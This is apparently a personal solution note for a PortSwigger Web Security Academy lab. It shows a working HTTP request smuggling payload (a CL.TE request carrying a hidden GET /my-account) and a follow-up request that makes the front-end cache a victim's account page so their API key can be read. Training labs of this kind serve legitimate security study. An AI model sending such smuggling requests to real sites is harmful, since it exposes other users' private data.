# [Exploiting HTTP request smuggling to perform web cache deception](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception)

- the goal is to make the frontend server to cache a static response

## exploit

- first request:

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: x
```

- second request

```
GET /resources/js/tracking.js HTTP/2
Host: xxx.web-security-academy.net
...
```

- search for the api key in the response, and submit it on the page
